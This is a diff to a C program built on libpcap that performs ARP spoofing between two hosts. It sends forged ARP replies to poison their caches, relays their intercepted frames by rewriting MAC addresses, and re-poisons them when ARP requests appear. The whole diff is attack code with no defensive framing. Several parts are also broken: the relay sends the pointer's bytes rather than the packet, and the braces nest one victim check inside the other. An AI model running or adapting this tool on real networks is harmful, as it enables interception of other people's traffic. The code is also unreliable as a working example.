@@ -42,6 +42,7 @@ typedef struct {
 typedef struct {
     char adapter[20];
     mac_addr mac[3];
+    ip_addr myip[3];
     arp_packet packet[2];
 } arp_table;
 
@@ -145,6 +146,10 @@ void get_my_ip_address(char* interface, arp_packet* packet) {
     for(int i = 0; i < 4; i++) packet->senderIp.oct[i] = atoi(tmp[i]);
 }
 
+int mac_compare(arp_table* table, mac_addr* mac, int a) {
+    return (table->mac[a].oct[0] == mac->oct[0] && table->mac[a].oct[1] == mac->oct[1] && table->mac[a].oct[2] == mac->oct[2] && table->mac[a].oct[3] == mac->oct[3] && table->mac[a].oct[4] == mac->oct[4] && table->mac[a].oct[5] == mac->oct[5]);
+}
+
 void *arp_thread(void* packet) {
     arp_table* table = (arp_table*)packet;
     pcap_t* handle = pcap_open_live(table->adapter, BUFSIZ, 1, 1000, NULL);
@@ -157,19 +162,28 @@ void *arp_thread(void* packet) {
         struct pcap_pkthdr* header;
         u_char* res;
         pcap_next_ex(handle, &header, &res);
+        if(res == 0) continue;
         mac = *((mac_addr*)(res + 6));
-        for(int i = 0; i < 2; i++)
-            if(table->mac[i].oct[0] == mac.oct[0] && table->mac[i].oct[1] == mac.oct[1] && table->mac[i].oct[2] == mac.oct[2] && table->mac[i].oct[3] == mac.oct[3] && table->mac[i].oct[4] == mac.oct[4] && table->mac[i].oct[5] == mac.oct[5]) {
-                for(int j = 0; j < 6; j++) {
-                    res[6 + j] = table->mac[i + ((i - 1) * -1) + 1].oct[j];
-                }
-                pcap_sendpacket(handle, (const u_char*)&res, sizeof(res));
+        if(mac_compare(table, &mac, 1)) {
+            for(int j = 0; j < 6; j++) {
+                res[j] = table->mac[2].oct[j];
+                res[6 + j] = table->mac[0].oct[j];
             }
-        if(res[12] == 0x08 && res[13] == 0x06 && res[21] == 0x01) {
-                for(int i = 0; i < 2; i++)
-                    pcap_sendpacket(handle, (const u_char*)&table->packet[i], sizeof(table->packet[i]));
+            for(int j = 0; j < 4; j++) res[26 + j] = table->myip[0].oct[j];
+            pcap_sendpacket(handle, (const u_char*)&res, sizeof(res));
+        if(mac_compare(table, &mac, 2)) {
+            for(int j = 0; j < 6; j++) {
+                res[j] = table->mac[1].oct[j];
+                res[6 + j] = table->mac[0].oct[j];
+            }
+            for(int j = 0; j < 4; j++) res[26 + j] = table->myip[0].oct[j];
+            pcap_sendpacket(handle, (const u_char*)&res, sizeof(res));
         }
-        res = NULL;
+        }
+        if(res[12] == 0x08 && res[13] == 0x06 && res[21] == 0x01 && (mac_compare(table, &mac, 1) || mac_compare(table, &mac, 2))) {
+            for(int i = 0; i < 2; i++)
+                pcap_sendpacket(handle, (const u_char*)&table->packet[i], sizeof(table->packet[i]));
+        }
     }
     return NULL;
 }
@@ -195,7 +209,8 @@ int main(int argc, char* argv[]) {
         struct pcap_pkthdr* header;
 
         get_my_mac_address(table.adapter, &table.mac[0]);
-
+        
+        get_my_ip_address(table.adapter, &table.myip[0]);
         for(int k = 0; k < 2; k++){
             const u_char* res;
             for(int j = 0; j < 6; j++) table.packet[k].dest.oct[j] = 0xff;
@@ -220,7 +235,10 @@ int main(int argc, char* argv[]) {
             table.packet[k].dest = table.mac[k + 1];
             table.packet[k].targetMac = table.mac[k + 1];
             tmp = split(argv[i + ((k - 1) * -1)], '.');
-            for(int j = 0; j < 4; j++) table.packet[k].senderIp.oct[j] = atoi(tmp[j]);
+            for(int j = 0; j < 4; j++) {
+                table.packet[k].senderIp.oct[j] = atoi(tmp[j]);
+                table.myip[k].oct[j] = atoi(tmp[j]);
+            }
             pcap_sendpacket(handle, (const u_char*)&table.packet[k], sizeof(table.packet[k]));
         }
 
